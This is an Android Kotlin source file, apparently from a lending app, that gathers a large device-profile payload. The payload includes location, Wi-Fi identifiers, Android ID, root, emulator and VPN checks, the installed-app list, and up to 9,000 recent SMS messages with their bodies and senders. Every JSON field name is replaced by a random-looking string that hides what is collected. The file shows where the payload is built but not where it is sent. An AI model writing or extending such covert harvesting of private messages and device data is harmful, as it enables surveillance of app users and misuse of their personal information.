package com.creditcedi.app

import android.Manifest
import android.app.ActivityManager
import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.os.SystemClock
import android.provider.Settings
import android.provider.Telephony
import android.telephony.TelephonyManager
import android.util.DisplayMetrics
import android.view.WindowManager
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.Locale
import java.util.TimeZone

private object DeviceField {
    const val FILES = "UnZiELN4dmLyfBKBZV8ETgIbobTXAedQg7hJ"
    const val STORAGE = "ARV4Alp3oiG3wsnUamVcqoFyZRy8qpRnC"
    const val SCREEN = "hn4aeJ5dWY8RGaCDmHHtn8BINqAtZS5TRk"
    const val GENERAL = "b3IwlcOzeI2kMlsJjy7KVRMUQ1zRt"
    const val LOCALE = "t11D4cbk4hx"
    const val BASE_INFO = "sADkPVe4lxfUKthaxcQ5V3gQpXaVVP87OEc"
    const val IMEI = "s4R8vxJ2za0Mqle7pE794SH4sVY362RTXQ"
    const val CAMERA = "tP1rHWHJ"
    const val BATTERY = "UnKdHFm0MnYMB"
    const val NETWORK = "qhvbz5h2Ix9u3I"
    const val LOCATION = "m6FHeWsCggvTABACgnwkSoOi"
    const val SMS = "clNgmv3XvR1S8pgVW"
    const val APPS = "iD3xqW7WYEwqZTJ8sc18qkt1"

    const val IMAGES_EXTERNAL = "Pkj5UciMHPU"
    const val VIDEO_INTERNAL = "ed3JAYlpN2dQ1uqVCMMS09bulw9pELILQMe"
    const val DOWNLOAD_FILES = "LTpxbj21ePfOC"
    const val VIDEO_EXTERNAL = "gKEdkTiNY"
    const val AUDIO_EXTERNAL = "RcI4Kfa1VYYgtpvx"
    const val IMAGES_INTERNAL = "q2X8CUK"
    const val AUDIO_INTERNAL = "ebfcr3pPsAALfqjv"
    const val MEMORY_CARD_SIZE = "fuaEmV"
    const val MEMORY_CARD_USED = "Uu2AF7EzVKuv2QQkDwrhHo1uLZuH8gYYE3"
    const val INTERNAL_STORAGE_USABLE = "OCJWLv7kn2cjqwfJufq3icY8GYqWI23yn"
    const val INTERNAL_STORAGE_TOTAL = "o9c7EZrgpRb"
    const val EXTERNAL_STORAGE_TOTAL = "xuAflIOBYOu6fdf2AtS31eeFdXtCJjcWoxeor"
    const val EXTERNAL_STORAGE_AVAILABLE = "e45FnoUjYnAIOxKxEp9Tds"
    const val RAM_TOTAL = "R3rW3k356C0brEebdvHz7PpKECyz0A"
    const val RAM_USABLE = "NeOcPrSc4ajRzpqQk4aAPMRBDLur1"
    const val APP_TOTAL_MEMORY = "uGTU13mQEM"
    const val APP_MAX_MEMORY = "r0ORofKGnx7EoBPlpvp88BrnHVW"
    const val APP_FREE_MEMORY = "kpnec15D6"
    const val DENSITY_DPI = "TGQxF1pgfp4M"
    const val XDPI = "DyHRDYnAC8LiWWOVuXC6x46bma8FidbBsK1"
    const val YDPI = "v0OxetMqEMIQMVZ7pZJyTilcx5LFPBpQOSmS"
    const val WIDTH = "T1Cc6bJuzWEMeaSwm"
    const val HEIGHT = "DuuxezkCaZQvYjpxLQBSLTXv"
    const val RESOLUTION = "fSvGNCBuCFWYodr46nL4tla11dI"
    const val DENSITY = "IxwexkaZHUQtixHgUja"
    const val SCALED_DENSITY = "n7qpo0oRxkVxIHR2A5d9gaDS"
    const val PROXY = "wX0Mr2P5DJx0xYh"
    const val DEVELOPER_MODE = "mmmV9BkX7tJ7jkXO1Kv2wzLkx9Vq"
    const val USB_DEBUG = "CKsn2VV6"
    const val MOCK_LOCATION = "jzyjxAT5urcMWSe9SQ7WQl3EiiIlh8XW"
    const val KEYBOARD_TYPE = "FUE7lwIewd"
    const val CAN_CALL = "AugSJr2"
    const val SIMULATOR = "b3AtC3hUQ5"
    const val UPTIME = "G36SAoGziWivMoJMUA"
    const val ROOT = "AX2qIVc"
    const val LAST_BOOT = "mzGJmxaxPDT5EBiilixUZb"
    const val VPN = "jltF4QmRpsSXG"
    const val LANGUAGE = "GUBOT9DGYUNy11Le9f0dTvi7oiYP1ILX2G"
    const val TIME_ZONE = "VrVjc057aVLGom9EM"
    const val DISPLAY_LANGUAGE = "uWFv5gypUtcV19as4NXUGe9rJb"
    const val OPERATOR_NAME = "XRLXRYmSLXhpXtJFCTvyNoH"
    const val ISO3_COUNTRY = "f1vqVZkb9eqwHuVOx9nw8H"
    const val SIM_COUNTRY = "hTSG7CIDcbmk00jsZitoutPFzpjKiio3Kn"
    const val ISO3_LANGUAGE = "jeJmZbJU0P8tZHebPGkgh9XfWtQp"
    const val FINGERPRINT = "osIrCvAADjbAyoyivDdl4cGvF77oLCKlJNh24"
    const val SERIAL_NUMBER = "dAFUhoVr61Xt9Rku"
    const val BUILD_TIME = "AWxOc1tBHZgj9lpiJSBeVCX9v0haJLymO00Q"
    const val PHONE_TYPE = "R1PvrnX4B3fkVEKLZzjqCKsHleARZcoH"
    const val BRAND = "K9KWYEodQw3TD3ax0HorhoG1K1enr"
    const val MANUFACTURER = "oxS5EHJrqZZyPxLGMdRg"
    const val MODEL = "H9xJr8WANMT3Oe"
    const val RELEASE = "rHGTtnjbveaJRCo8xQ"
    const val BOARD = "Alh4aeD0kmb0hodVsyHkBIGCigvVYZNdXN"
    const val DEVICE_NAME = "Aet7ofHMwWRL0bomeFJ2zLUsAjBUqjdWk8Of"
    const val CPU_CORES = "OjNv6DFM6Avq6wplHFr"
    const val PHYSICAL_SIZE = "Il8zMUrDGGo9aj"
    const val SDK_VERSION = "czF3Ci0KBG"
    const val ANDROID_ID = "f3xQgxyub4YCyN2CTwXTlLCMlxhkHRjif"
    const val LINE_NUMBER = "Loh6OMXR41VI"
    const val IMEI1 = "EneN0Ulnr8F671B"
    const val IMEI2 = "as0HDKVTR8Wx9AO2WL1j2"
    const val SUBSCRIBER_ID = "ZRXLGXW8wUxXMMc"
    const val SIM_SERIAL = "m3LSdU"
    const val CAMERA_NUMBER = "zQ0GJcgWNJ49KgFYPRo1n2VRTMaj"
    const val BATTERY_MAX = "E63nihLtcHrQwpmKgAcSCL"
    const val BATTERY_STATE = "XMaxEzyr5p8Yd"
    const val CHARGING = "ke9xzZeF9q2ZS9x"
    const val BATTERY_PERCENT = "IZjALAFxvU2rd4kB"
    const val AC_CHARGE = "tQr5OzlAZfqv1Ao2vviELMmyx5z3us9p4bYz"
    const val USB_CHARGE = "wh6mgcnPDoug3Pmc2E4aLL1BTpTeVruR4Dc"
    const val BATTERY_LEVEL = "l62HxOYAQcIugsdDKK"
    const val NETWORK_TYPE = "XshsNLKRvmTUkSDvu2"
    const val MAC = "opYwcfYR3yXfRZudU5"
    const val IP = "bP4wOl8cXEiiXKpw4xQ2hlj4"
    const val CURRENT_WIFI = "VZw8FsQKvOhmW6M6idCzTvy1pleBlk"
    const val SSID = "gkenytz"
    const val BSSID = "cOzmzrQuF5NWZnu"
    const val TIME = "fAOE0AWFPl6uYiANzfRXz1sPl5LMe22G78wM3"
    const val ADDRESS_OBJECT = "BuaEnVbKr3"
    const val ADMIN_AREA = "OrAgpgv0rmqqv"
    const val COUNTRY_CODE = "cYMOErLbBAJD1wxAedGd1ds6eBwpE"
    const val COUNTRY_NAME = "Avd6h1Aii4hJnsrMqPrn7dxoY6fxFN34V1CvE"
    const val FEATURE_NAME = "H1MpvufZONiW9BQQAlo"
    const val ADDRESS = "BGeveoDIfVy27zhjZThZfEnrEhpKL9B2Z"
    const val LOCALITY = "ZOy3rU"
    const val SUB_ADMIN_AREA = "HWdiCxXW9BwKXsLMmLWUXWd4BBx"
    const val LATITUDE = "rXKwtzhZ5"
    const val LONGITUDE = "gWEBhlEpsLxi6ooZIB7IMQTDgWP"
    const val ACCURACY = "RWu3tSKBeJ5CSSxwMsaEM"
    const val PROTOCOL = "ONDvoF8FoA09pz"
    const val SMS_TYPE = "FvrVrV3ebC2"
    const val ID = "Uf9cql9S9l9ma"
    const val STATUS = "qAvxzmtXnQcr1qIqP4zFt9kcGtxHWnUfm"
    const val DATE_SENT = "MOgLSk90V3ptJabd0eFnYDFiABvdZDWfR"
    const val SMS_ADDRESS = "eZtWfbA4n"
    const val THREAD_ID = "e5prr903GPQ8g40zLxYaZe"
    const val SUBSCRIPTION_ID = "IYu1AbKUUGEKuJ841lg5mXBLTt69KVZdUl"
    const val READ = "GXhKBh"
    const val DATE = "dghfE4JJCPP7Umka5Df"
    const val SEEN = "mB11KvhudYMX9WC2dMlzSbnAaEahPdTRM1j"
    const val BODY = "XzwCrZpGBK"
    const val SUBJECT = "amX8wDQURCksBo2pfqbYuKX"
    const val PERSON = "ZQZhmETtW3lnQTnCNp"
    const val APP_VERSION_CODE = "G6EbFdaSztXyj5dqfAx5fOyw8"
    const val INSTALL_TIME = "OEUdonp5SFUZqifWeu"
    const val APP_PACKAGE = "gNDkt7ikiFZm2"
    const val APP_VERSION_NAME = "FWTHJ7F18eQMF"
    const val APP_FLAGS = "dQltA2IR5uz1v5ValSwqYOd8DaC"
    const val APP_NAME = "uCRwhuLuJlFF"
    const val UPDATE_TIME = "Kqb0rLlIyqJ5dZZXa"
    const val APP_TYPE = "Qv8WoayRfiN0qmwA6qUzhoZ"
}

internal class DevicePayloadCollector(
    private val context: Context,
    private val header: JSONObject
) {
    fun asJson(): String = JSONObject().apply {
        put(DeviceField.FILES, collectFiles())
        put(DeviceField.STORAGE, collectStorage())
        put(DeviceField.SCREEN, collectScreen())
        put(DeviceField.GENERAL, collectGeneral())
        put(DeviceField.LOCALE, collectLocale())
        put(DeviceField.BASE_INFO, collectBaseInfo())
        put(DeviceField.IMEI, collectTelephony())
        put(DeviceField.CAMERA, collectCamera())
        put(DeviceField.BATTERY, collectBattery())
        put(DeviceField.NETWORK, collectNetwork())
        put(DeviceField.LOCATION, collectLocation())
        put(DeviceField.SMS, collectSms())
        put(DeviceField.APPS, collectApps())
    }.toString()

    private fun collectFiles() = JSONObject().apply {
        put(DeviceField.IMAGES_EXTERNAL, 0)
        put(DeviceField.VIDEO_INTERNAL, 0)
        put(DeviceField.DOWNLOAD_FILES, 0)
        put(DeviceField.VIDEO_EXTERNAL, 0)
        put(DeviceField.AUDIO_EXTERNAL, 0)
        put(DeviceField.IMAGES_INTERNAL, 0)
        put(DeviceField.AUDIO_INTERNAL, 0)
    }

    private fun collectStorage() = JSONObject().apply {
        val internal = safe { StatFs(Environment.getDataDirectory().path) }
        val external = safe { context.getExternalFilesDir(null)?.let { StatFs(it.path) } }
        val memory = safe { context.getSystemService(ActivityManager::class.java)?.let { manager ->
            ActivityManager.MemoryInfo().also(manager::getMemoryInfo)
        } }
        put(DeviceField.MEMORY_CARD_SIZE, external?.totalBytes ?: 0L)
        put(DeviceField.MEMORY_CARD_USED, ((external?.totalBytes ?: 0L) - (external?.availableBytes ?: 0L)).coerceAtLeast(0L))
        put(DeviceField.INTERNAL_STORAGE_USABLE, internal?.availableBytes ?: 0L)
        put(DeviceField.INTERNAL_STORAGE_TOTAL, internal?.totalBytes ?: 0L)
        put(DeviceField.EXTERNAL_STORAGE_TOTAL, external?.totalBytes ?: 0L)
        put(DeviceField.EXTERNAL_STORAGE_AVAILABLE, external?.availableBytes ?: 0L)
        put(DeviceField.RAM_TOTAL, memory?.totalMem ?: 0L)
        put(DeviceField.RAM_USABLE, memory?.availMem ?: 0L)
        put(DeviceField.APP_TOTAL_MEMORY, Runtime.getRuntime().totalMemory())
        put(DeviceField.APP_MAX_MEMORY, Runtime.getRuntime().maxMemory())
        put(DeviceField.APP_FREE_MEMORY, Runtime.getRuntime().freeMemory())
    }

    private fun collectScreen(): JSONObject {
        val metrics = DisplayMetrics()
        safe {
            @Suppress("DEPRECATION")
            (context.getSystemService(Context.WINDOW_SERVICE) as WindowManager).defaultDisplay.getRealMetrics(metrics)
        }
        val density = metrics.density.takeIf { it > 0 } ?: 1f
        return JSONObject().apply {
            put(DeviceField.DENSITY_DPI, metrics.densityDpi)
            put(DeviceField.XDPI, metrics.xdpi.toString())
            put(DeviceField.YDPI, metrics.ydpi.toString())
            put(DeviceField.WIDTH, metrics.widthPixels)
            put(DeviceField.HEIGHT, metrics.heightPixels)
            put(DeviceField.RESOLUTION, "${metrics.widthPixels}x${metrics.heightPixels}")
            put(DeviceField.DENSITY, density.toString())
            put(DeviceField.SCALED_DENSITY, metrics.scaledDensity.toString())
        }
    }

    private fun collectGeneral(): JSONObject {
        val facts = context.deviceRequestFacts()
        val developer = safe { Settings.Global.getInt(context.contentResolver, Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) }
        val usbDebug = safe { Settings.Global.getInt(context.contentResolver, Settings.Global.ADB_ENABLED, 0) }
        val mockLocation = safe { Settings.Secure.getInt(context.contentResolver, Settings.Secure.ALLOW_MOCK_LOCATION, 0) }
        val manager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val vpn = safe {
            manager.activeNetwork?.let { manager.getNetworkCapabilities(it)?.hasTransport(NetworkCapabilities.TRANSPORT_VPN) } == true
        }
        val fingerprint = (Build.FINGERPRINT + Build.MODEL + Build.MANUFACTURER).lowercase(Locale.US)
        val emulator = listOf("generic", "emulator", "sdk_gphone", "goldfish", "ranchu").any(fingerprint::contains)
        val rooted = listOf("/system/bin/su", "/system/xbin/su", "/sbin/su", "/system/app/Superuser.apk").any { File(it).exists() }
        return JSONObject().apply {
            put(DeviceField.PROXY, if (System.getProperty("http.proxyHost").isNullOrBlank()) 0 else 1)
            put(DeviceField.DEVELOPER_MODE, developer)
            put(DeviceField.USB_DEBUG, usbDebug)
            put(DeviceField.MOCK_LOCATION, mockLocation)
            put(DeviceField.KEYBOARD_TYPE, safe { context.resources.configuration.keyboard })
            put(DeviceField.CAN_CALL, if (context.packageManager.hasSystemFeature(PackageManager.FEATURE_TELEPHONY)) 1 else 0)
            put(DeviceField.SIMULATOR, if (emulator) 1 else 0)
            put(DeviceField.UPTIME, SystemClock.elapsedRealtime())
            put(DeviceField.ROOT, if (rooted) 1 else 0)
            put(DeviceField.LAST_BOOT, System.currentTimeMillis() - SystemClock.elapsedRealtime())
            put(DeviceField.VPN, if (vpn == true) 1 else 0)
            put(ApiField.IS_EMULATOR, facts[ApiField.IS_EMULATOR] ?: "0")
            put(ApiField.IS_VPN, facts[ApiField.IS_VPN] ?: "0")
            put(ApiField.IS_ROOT, facts[ApiField.IS_ROOT] ?: "0")
        }
    }

    private fun collectLocale() = JSONObject().apply {
        val locale = Locale.getDefault()
        val telephony = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        put(DeviceField.LANGUAGE, locale.language)
        put(DeviceField.TIME_ZONE, TimeZone.getDefault().id)
        put(DeviceField.DISPLAY_LANGUAGE, locale.displayLanguage)
        put(DeviceField.OPERATOR_NAME, safe { telephony.networkOperatorName }.orEmpty())
        put(DeviceField.ISO3_COUNTRY, safe { locale.getISO3Country() }.orEmpty())
        put(DeviceField.SIM_COUNTRY, safe { telephony.simCountryIso }.orEmpty())
        put(DeviceField.ISO3_LANGUAGE, safe { locale.getISO3Language() }.orEmpty())
    }

    private fun collectBaseInfo() = JSONObject().apply {
        val headerKeys = header.keys()
        while (headerKeys.hasNext()) {
            val key = headerKeys.next()
            put(key, header.opt(key))
        }
        val telephony = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val metrics = DisplayMetrics()
        safe {
            @Suppress("DEPRECATION")
            (context.getSystemService(Context.WINDOW_SERVICE) as WindowManager).defaultDisplay.getRealMetrics(metrics)
        }
        val physical = if (metrics.xdpi > 0 && metrics.ydpi > 0) {
            kotlin.math.sqrt((metrics.widthPixels / metrics.xdpi).let { it * it } + (metrics.heightPixels / metrics.ydpi).let { it * it })
        } else 0.0
        put(DeviceField.FINGERPRINT, Build.FINGERPRINT.orEmpty())
        put(DeviceField.SERIAL_NUMBER, "unknown")
        put(DeviceField.BUILD_TIME, Build.TIME)
        put(DeviceField.ANDROID_ID, safe { Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) }.orEmpty())
        put(DeviceField.PHONE_TYPE, safe { telephony.phoneType })
        put(DeviceField.BRAND, Build.BRAND.orEmpty())
        put(DeviceField.MANUFACTURER, Build.MANUFACTURER.orEmpty())
        put(DeviceField.MODEL, Build.MODEL.orEmpty())
        put(DeviceField.RELEASE, Build.VERSION.RELEASE.orEmpty())
        put(DeviceField.BOARD, Build.BOARD.orEmpty())
        put(DeviceField.DEVICE_NAME, Build.DEVICE.orEmpty())
        put(DeviceField.CPU_CORES, Runtime.getRuntime().availableProcessors())
        put(DeviceField.PHYSICAL_SIZE, String.format(Locale.US, "%.2f", physical))
        put(DeviceField.SDK_VERSION, Build.VERSION.SDK_INT)
    }

    private fun collectTelephony() = JSONObject().apply {
        put(DeviceField.LINE_NUMBER, "")
        put(DeviceField.IMEI1, "")
        put(DeviceField.SUBSCRIBER_ID, "")
        put(DeviceField.IMEI2, "")
        put(DeviceField.SIM_SERIAL, "")
    }

    private fun collectCamera() = JSONObject().apply {
        val count = safe {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                (context.getSystemService(Context.CAMERA_SERVICE) as android.hardware.camera2.CameraManager).cameraIdList.size
            } else 0
        }
        put(DeviceField.CAMERA_NUMBER, count)
    }

    private fun collectBattery(): JSONObject {
        val intent = safe {
            context.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
        }
        val level = intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, 0) ?: 0
        val scale = intent?.getIntExtra(BatteryManager.EXTRA_SCALE, 100)?.coerceAtLeast(1) ?: 100
        val status = intent?.getIntExtra(BatteryManager.EXTRA_STATUS, BatteryManager.BATTERY_STATUS_UNKNOWN)
            ?: BatteryManager.BATTERY_STATUS_UNKNOWN
        val plugged = intent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0) ?: 0
        return JSONObject().apply {
            put(DeviceField.BATTERY_MAX, "")
            put(DeviceField.BATTERY_STATE, status)
            put(DeviceField.CHARGING, if (status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL) 1 else 0)
            put(DeviceField.BATTERY_PERCENT, level * 100 / scale)
            put(DeviceField.AC_CHARGE, if (plugged == BatteryManager.BATTERY_PLUGGED_AC) 1 else 0)
            put(DeviceField.USB_CHARGE, if (plugged == BatteryManager.BATTERY_PLUGGED_USB) 1 else 0)
            put(DeviceField.BATTERY_LEVEL, level)
        }
    }

    private fun collectNetwork(): JSONObject {
        val connectivity = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = safe { connectivity.activeNetwork }
        val capabilities = safe { network?.let(connectivity::getNetworkCapabilities) }
        val wifi = context.getSystemService(Context.WIFI_SERVICE) as WifiManager
        val wifiInfo = safe { wifi.connectionInfo }
        val link = safe { network?.let(connectivity::getLinkProperties) }
        val networkType = when {
            capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true -> "Wi-Fi"
            capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "Mobile"
            capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) == true -> "Ethernet"
            else -> "Unknown"
        }
        val currentWifi = JSONObject().apply {
            put(DeviceField.BSSID, wifiInfo?.bssid.orEmpty())
            put(DeviceField.SSID, wifiInfo?.ssid.orEmpty())
        }
        return JSONObject().apply {
            put(DeviceField.NETWORK_TYPE, networkType)
            put(DeviceField.MAC, "")
            put(DeviceField.IP, link?.linkAddresses?.firstOrNull()?.address?.hostAddress.orEmpty())
            put(DeviceField.CURRENT_WIFI, currentWifi)
        }
    }

    private fun collectLocation(): JSONObject {
        val allowed = context.checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
        val location = if (allowed) safe {
            val manager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            manager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
        } else null
        val address = JSONObject().apply {
            put(DeviceField.ADMIN_AREA, "")
            put(DeviceField.COUNTRY_CODE, Locale.getDefault().country)
            put(DeviceField.COUNTRY_NAME, Locale.getDefault().displayCountry)
            put(DeviceField.FEATURE_NAME, "")
            put(DeviceField.ADDRESS, JSONArray())
            put(DeviceField.LOCALITY, "")
            put(DeviceField.SUB_ADMIN_AREA, "")
        }
        return JSONObject().apply {
            put(DeviceField.TIME, location?.time ?: 0L)
            put(DeviceField.ADDRESS_OBJECT, address)
            put(DeviceField.LATITUDE, location?.latitude?.toString().orEmpty())
            put(DeviceField.LONGITUDE, location?.longitude?.toString().orEmpty())
            put(DeviceField.ADDRESS, "")
            put(DeviceField.ACCURACY, location?.accuracy?.toString().orEmpty())
        }
    }

    private fun collectSms(): JSONArray {
        if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return JSONArray()
        val cutoff = System.currentTimeMillis() - 180L * 24 * 60 * 60 * 1000
        val fields = arrayOf(
            Telephony.Sms._ID, Telephony.Sms.ADDRESS, Telephony.Sms.DATE, Telephony.Sms.DATE_SENT,
            Telephony.Sms.TYPE, Telephony.Sms.STATUS, Telephony.Sms.READ, Telephony.Sms.SEEN,
            Telephony.Sms.PROTOCOL, Telephony.Sms.THREAD_ID, Telephony.Sms.SUBSCRIPTION_ID,
            Telephony.Sms.SUBJECT, Telephony.Sms.BODY, Telephony.Sms.PERSON
        )
        val rows = JSONArray()
        safe {
            context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                fields,
                "${Telephony.Sms.DATE} >= ?",
                arrayOf(cutoff.toString()),
                "${Telephony.Sms.DATE} DESC LIMIT 9000"
            )?.use { cursor ->
                fun value(column: String): String {
                    val index = cursor.getColumnIndex(column)
                    return if (index >= 0 && !cursor.isNull(index)) cursor.getString(index).orEmpty() else ""
                }
                while (cursor.moveToNext() && rows.length() < 9000) {
                    rows.put(JSONObject().apply {
                        put(DeviceField.ID, value(Telephony.Sms._ID))
                        put(DeviceField.SMS_ADDRESS, value(Telephony.Sms.ADDRESS))
                        put(DeviceField.DATE, value(Telephony.Sms.DATE))
                        put(DeviceField.DATE_SENT, value(Telephony.Sms.DATE_SENT))
                        put(DeviceField.SMS_TYPE, value(Telephony.Sms.TYPE))
                        put(DeviceField.STATUS, value(Telephony.Sms.STATUS))
                        put(DeviceField.READ, value(Telephony.Sms.READ))
                        put(DeviceField.SEEN, value(Telephony.Sms.SEEN))
                        put(DeviceField.PROTOCOL, value(Telephony.Sms.PROTOCOL))
                        put(DeviceField.THREAD_ID, value(Telephony.Sms.THREAD_ID))
                        put(DeviceField.SUBSCRIPTION_ID, value(Telephony.Sms.SUBSCRIPTION_ID))
                        put(DeviceField.SUBJECT, value(Telephony.Sms.SUBJECT))
                        put(DeviceField.BODY, value(Telephony.Sms.BODY))
                        put(DeviceField.PERSON, value(Telephony.Sms.PERSON))
                    })
                }
            }
        }
        return rows
    }

    private fun collectApps(): JSONArray {
        val installed = safe { context.packageManager.getInstalledPackages(0) }.orEmpty()
        val recentByPackage = installed.asSequence()
            .filter { safe { context.packageManager.getLaunchIntentForPackage(it.packageName) } != null }
            .groupBy { it.packageName }
            .mapNotNull { (_, versions) -> versions.maxByOrNull { it.lastUpdateTime } }
        return JSONArray().apply {
            recentByPackage.forEach { info ->
                safe {
                    val application = info.applicationInfo ?: return@safe
                    put(JSONObject().apply {
                        put(DeviceField.APP_VERSION_CODE, if (Build.VERSION.SDK_INT >= 28) info.longVersionCode else info.versionCode)
                        put(DeviceField.INSTALL_TIME, info.firstInstallTime)
                        put(DeviceField.APP_PACKAGE, info.packageName)
                        put(DeviceField.APP_VERSION_NAME, info.versionName.orEmpty())
                        put(DeviceField.APP_FLAGS, application.flags.toString())
                        put(DeviceField.APP_NAME, context.packageManager.getApplicationLabel(application).toString())
                        put(DeviceField.UPDATE_TIME, info.lastUpdateTime)
                        put(DeviceField.APP_TYPE, if (application.flags and ApplicationInfo.FLAG_SYSTEM != 0) 1 else 0)
                    })
                }
            }
        }
    }

    private inline fun <T> safe(block: () -> T): T? = try { block() } catch (_: Exception) { null }
}
